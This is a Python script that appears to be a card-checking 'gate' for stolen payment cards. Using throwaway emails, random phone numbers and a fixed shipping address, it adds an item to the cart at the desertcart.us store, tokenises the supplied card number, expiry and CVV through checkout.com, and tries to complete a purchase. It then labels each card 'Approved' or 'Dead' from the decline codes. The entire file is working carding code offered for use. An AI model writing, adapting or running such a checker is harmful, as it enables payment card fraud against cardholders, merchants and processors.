from httpx import AsyncClient
from utilsdf.functions import capture, random_email, random_phone


async def hinata(cc, month, year, cvv):
    mail = random_email()
    phone = random_phone()


    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        head = {
            'authority': 'www.desertcart.us',
            'accept': 'application/vnd.api+json; version:3.0',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/vnd.api+json',
            # 'cookie': '_gcl_au=1.1.1920920886.1709492738; _scid=6763ee18-d9ad-4217-ae89-59202d422359; _fbp=fb.1.1709492740311.1901391078; _tt_enable_cookie=1; _ttp=wJVehWtHitikM_WA40jE2wLwzK5; _hjSessionUser_3836476=eyJpZCI6ImY1M2NkOTcxLWIxM2MtNTEwYi1hMzdhLWUyZGYzNzg5NDAzNiIsImNyZWF0ZWQiOjE3MDk0OTI3ODgwMTEsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.387233086.1710123719; _sctr=1%7C1710108000000; _ga=GA1.1.1740204578.1709492739; __kla_id=eyJjaWQiOiJNVEEwWVRFNFpEY3RZV0k0TXkwME9XVTNMV0psWlRrdFkyTmxPVFV4WlRJNFl6TmsiLCIkcmVmZXJyZXIiOnsidHMiOjE3MDk0OTI3MzksInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmRlc2VydGNhcnQudXMvIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNzEwMTIzNzQ5LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5kZXNlcnRjYXJ0LnVzL3Byb2R1Y3RzLzU1OTk0NDg0Ny1wby1wby10b3lzLWppZ3Nhdy0zLWQtcHV6emxlLXRveS1kaXktZm9yLWtpZHMtMy1kLXB1enpsZS1nYW1lLWFyY2hpdGVjdHVyZS1idWlsZGluZy1ibG9jay1mb3Ita2lkcy1hdHRyYWN0aXZlLXNob3ctcGllY2UtZWFzeS10by1hc3NlbWJsZS1wYWNrLW9mLTItbC0zMDItMzA2In0sIiRmaXJzdF9uYW1lIjoiYWNhc2MiLCIkbGFzdF9uYW1lIjoiYXNjYXNjIiwiJGV4Y2hhbmdlX2lkIjoiWTdGdjYtQ0FhQ2loTENKVkhpaUxnNkJyZnA0YU91WEYxdmFRX1FXTjJ5bG5NM0p1c2VLRkRBT2NWaGYyNlhXdHp2X2JIWDJvS0puamUzZjQ0d3hkeGcuWHQ3Zk15In0=; _scid_r=6763ee18-d9ad-4217-ae89-59202d422359; _ga_LVG3EHQKPX=GS1.1.1710123718.5.1.1710123755.0.0.0; _ga_WVPEXCXCDJ=GS1.1.1710123719.3.1.1710123778.0.0.0; _ga_1ZDZQGEVY5=GS1.1.1710123718.5.1.1710123778.60.0.1871482129',
            'origin': 'https://www.desertcart.us',
            'referer': 'https://www.desertcart.us/products/171770013-luv-lap-silicone-food-fruit-nibbler-with-extra-mesh-soft-pacifier-feeder-teether-for-infant-baby-infant-elegant-blue-bpa-free',
        }

        data = '{"product_id":171770013,"quantity":1,"active":true,"condition":"new","price":null,"order_item_location_id":null,"reflects_products_price":false,"source":"direct"}'


        r = await session.post(
            "https://www.desertcart.us/api/cart_items?include=cart",
            headers=head,
            json=data,
        )
        cart = capture(r.text, '"cart_token":"', '"')

        head2 = {
            "Host": "www.desertcart.us",
            "accept": "application/vnd.api+json; version:3.0",
            "x-locale": "en-us",
            "content-type": "application/vnd.api+json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            'origin': 'https://www.desertcart.us',
            'referer': 'https://www.desertcart.us/checkout',
        }

        post2 = {"key": "checkout_public_key"}

        r2 = await session.post(
            "https://www.desertcart.us/api/configurations",
            headers=head2,
            json=post2,
        )
        pk = capture(r2.text, '"checkout_public_key":"', '"')

        head3 = {
            "Host": "www.desertcart.us",
            "accept": "application/vnd.api+json; version:3.0",
            "x-locale": "en-us",
            "content-type": "application/vnd.api+json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "origin": "https://www.desertcart.us",
            "referer": "https://www.desertcart.us/cart",
            "x-cart-token": f"{cart}",
        }

        post3 = {
            "cart": {"cart_token": f"{cart}"},
            "user": {
                "email": f"{mail}",
                "referral_code": None,
                "phone_number": f"{phone}",
            },
            "shipping_address": {
                "first_name": "Sachio",
                "last_name": "YT",
                "address": "118 W 132nd St",
                "city": "New York",
                "country_code": "US",
                "province": "New York",
                "post_code": "10027",
                "phone_number": f"{phone}",
            },
        }

        r3 = await session.post(
            "https://www.desertcart.us/api/checkouts?include=orders%2Corders.order_items%2Cuser%2Cauthentication_token%2Cshipping_address",
            headers=head3,
            json=post3,
        )
        # with open("test.html", "w", encoding="utf-8") as f:
        #     f.write(r3.text)
        ch = capture(r3.text, '"checkout":{"id":', ",")
        us = capture(r3.text, '"user_id":', ",")
        to = capture(r3.text, '"token":"', '"')

        head4 = {
            "Host": "api.checkout.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "accept": "*/*",
            "origin": "https://js.checkout.com",
            "referer": "https://js.checkout.com/",
            "authorization": f"{pk}",
            "content-type": "application/json",
        }

        post4 = {
            "type": "card",
            "number": f"{cc}",
            "expiry_month": month,
            "expiry_year": year,
            "cvv": f"{cvv}",
            "phone": {},
            "preferred_scheme": "",
            "requestSource": "JS",
        }

        r4 = await session.post(
            "https://api.checkout.com/tokens",
            headers=head4,
            json=post4,
        )
        r44 = r4.text
        token = capture(r44, '"token":"', '"')
        last4 = capture(r44, '"last4":"', '"')
        bin_1 = capture(r44, '"bin":"', '"')
        issuer = capture(r44, '"issuer":"', '"')
        scheme = capture(r44, '"scheme":"', '"')
        card_type = capture(r44, '"card_type":"', '"')
        product_type = capture(r44, '"product_type":"', '"')
        issuer_country = capture(r44, '"issuer_country":"', '"')

        head5 = {
            "Host": "www.desertcart.us",
            "accept": "application/vnd.api+json; version:3.0",
            "x-locale": "en-us",
            "content-type": "application/vnd.api+json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "origin": "https://www.desertcart.us",
            "referer": "https://www.desertcart.us/cart",
            "x-user-id": f"{us}",
            "x-user-token": f"{to}",
        }

        post5 = {
            "provider": "checkout",
            "name": "Sachio YT",
            "card_token": f"{token}",
            "last4": f"{last4}",
            "bin": f"{bin_1}",
            "expiration_date": f"{month}/{year}",
            "active": True,
            "verify": False,
            "description": f"{issuer},{scheme},{card_type},{product_type}",
            "country_code": f"{issuer_country}",
        }

        r5 = await session.post(
            "https://www.desertcart.us/api/credit_cards",
            headers=head5,
            json=post5,
        )
        id_ = capture(r5.text, '"id":', ",")

        post6 = {"checkout_id": ch, "credit_card_id": id_}

        r6 = await session.post(
            "https://www.desertcart.us/api/checkout_credit_card_payments?include=orders%2Corders.order_items",
            headers=head5,
            json=post6,
        )
        price = capture(r6.text, '"formatted":"US$ ', '"')

        post7 = {
            "comment": None,
            "checkout_id": ch,
            "referral_code": None,
            "domain": "https://www.desertcart.us",
        }

        r7 = await session.post(
            "https://www.desertcart.us/api/checkout_confirmations?include=orders,orders.order_items",
            headers=head5,
            json=post7,
        )

        msg = capture(r7.text, '"credit_card":["', '"]')

        if r7.status_code == 200 or r7.status_code == 302:
            status = "Approved! ✅ -» low funds"
            msg = f"Thank You! -» ${price}"
        elif (
            msg
            == "Card can not be validated - response code: 20051. Please re-enter your card details and try again 20051: Insufficient Funds"
        ):
            status = "Approved! ✅ -» low funds"
        elif (
            msg
            == "Card can not be validated - response code: 200N7. Please re-enter your card details and try again 200N7: Decline for CVV2 Failure"
        ):
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
